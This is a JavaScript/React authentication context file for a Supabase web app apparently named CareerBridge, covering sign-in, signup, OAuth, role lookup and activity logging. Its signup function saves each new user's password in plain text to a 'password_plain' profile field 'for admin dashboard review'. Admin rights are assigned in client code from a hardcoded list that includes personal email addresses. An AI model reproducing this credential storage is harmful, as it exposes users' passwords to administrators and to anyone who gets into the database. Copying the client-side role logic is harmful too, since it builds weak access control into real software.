"use client";

import { createContext, useContext, useEffect, useState } from "react";
import { supabase } from "../lib/supabase";

const AuthContext = createContext();

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);

  const fetchUserRole = async (u) => {
    if (!u) return null;
    
    // Auto-detect admin emails for instant local client representation and secure fallback
    const adminEmails = ["12k21rakeshkannam@gmail.com", "admin@careerbridge.com", "kumardhanush6494@gmail.com"];
    const isMatchedAdmin = u.email && adminEmails.includes(u.email.toLowerCase());
    
    try {
      const { data, error } = await supabase
        .from("profiles")
        .select("role")
        .eq("id", u.id)
        .single();
      if (!error && data) {
        // Enforce admin email restriction: if email doesn't match list, they cannot have the admin role
        const finalRole = isMatchedAdmin ? "admin" : (data.role === "admin" ? "student" : (data.role || "student"));
        return { ...u, role: finalRole };
      }
    } catch (e) {
      console.warn("Failed to load user profile role from Supabase:", e.message);
    }
    return { ...u, role: isMatchedAdmin ? "admin" : "student" };
  };

  const logActivity = async (u, type) => {
    if (!u || !u.email) return;
    try {
      await supabase.from("user_activity").insert({
        user_id: u.id,
        email: u.email,
        activity_type: type
      });
    } catch (err) {
      console.warn("Failed to log user activity:", err);
    }
  };

  useEffect(() => {
    const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || "";
    const isPlaceholder = !supabaseUrl || supabaseUrl.includes("placeholder");

    if (isPlaceholder) {
      // Offline/Local Dev Mode Bypass: Auto-login mock student
      setUser({
        id: "mock-student-id",
        email: "student@careerbridge.com",
        role: "student",
        user_metadata: {
          full_name: "Local Student"
        }
      });
      setLoading(false);
      return;
    }

    // 1. Get initial session and fetch role
    supabase.auth.getSession().then(async ({ data: { session } }) => {
      if (session?.user) {
        const userWithRole = await fetchUserRole(session.user);
        setUser(userWithRole);
      } else {
        setUser(null);
      }
      setLoading(false);
    });

    // 2. Listen for auth changes
    const { data: { subscription } } = supabase.auth.onAuthStateChange(
      async (event, session) => {
        if (session?.user) {
          const userWithRole = await fetchUserRole(session.user);
          setUser(userWithRole);
          if (event === "SIGNED_IN") {
            logActivity(session.user, "login");
          }
        } else {
          setUser(prev => {
            if (prev) {
              logActivity(prev, "logout");
            }
            return null;
          });
        }
        setLoading(false);
      }
    );

    return () => {
      subscription.unsubscribe();
    };
  }, []);

  const login = async (email, password) => {
    const payload = (typeof email === "object" && email !== null) ? email : { email, password };
    
    const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || "";
    if (!supabaseUrl || supabaseUrl.includes("placeholder")) {
      throw new Error("Configuration required: Please configure valid Supabase credentials in your .env.local file.");
    }

    try {
      const { data, error } = await supabase.auth.signInWithPassword({
        email: payload.email,
        password: payload.password,
      });
      if (error) throw error;
      
      const userWithRole = await fetchUserRole(data.user);
      setUser(userWithRole);
      return userWithRole;
    } catch (err) {
      if (err.message === "Failed to fetch") {
        throw new Error("Connection failed: Please check your network connection or try disabling your VPN/Adblocker.");
      }
      throw err;
    }
  };

  const signup = async (email, password, name) => {
    const { data, error } = await supabase.auth.signUp({
      email,
      password,
      options: {
        data: {
          full_name: name,
        },
      },
    });
    if (error) throw error;

    // Write credentials to profiles table for admin dashboard review
    if (data?.user) {
      try {
        const { error: profileError } = await supabase
          .from("profiles")
          .update({
            email: email,
            password_plain: password
          })
          .eq("id", data.user.id);
        if (profileError) console.error("Failed to save credentials in profile:", profileError);
      } catch (e) {
        console.error("Profile credentials save error:", e);
      }
    }

    // Automatically log in the user immediately after successful registration
    try {
      const { data: loginData, error: loginError } = await supabase.auth.signInWithPassword({
        email,
        password,
      });
      if (!loginError && loginData) {
        const userWithRole = await fetchUserRole(loginData.user);
        setUser(userWithRole);
      }
    } catch (loginErr) {
      console.warn("Auto login post-registration failed:", loginErr);
    }

    return data.user;
  };

  const loginWithGoogle = async () => {
    const { error } = await supabase.auth.signInWithOAuth({
      provider: "google",
      options: {
        redirectTo: `${window.location.origin}/`,
      },
    });
    if (error) throw error;
  };

  const loginWithOutlook = async () => {
    const { error } = await supabase.auth.signInWithOAuth({
      provider: "azure",
      options: {
        redirectTo: `${window.location.origin}/`,
        scopes: "openid profile email",
      },
    });
    if (error) throw error;
  };

  const logout = async (redirectPath = "/login") => {
    await supabase.auth.signOut();
    setUser(null);
    const targetPath = (typeof redirectPath === "string") ? redirectPath : "/login";
    if (targetPath) {
      window.location.href = targetPath;
    }
  };

  return (
    <AuthContext.Provider
      value={{
        user,
        login,
        signup,
        loginWithGoogle,
        loginWithOutlook,
        logout,
        loading,
      }}
    >
      {children}
    </AuthContext.Provider>
  );
}

export const useAuth = () => useContext(AuthContext);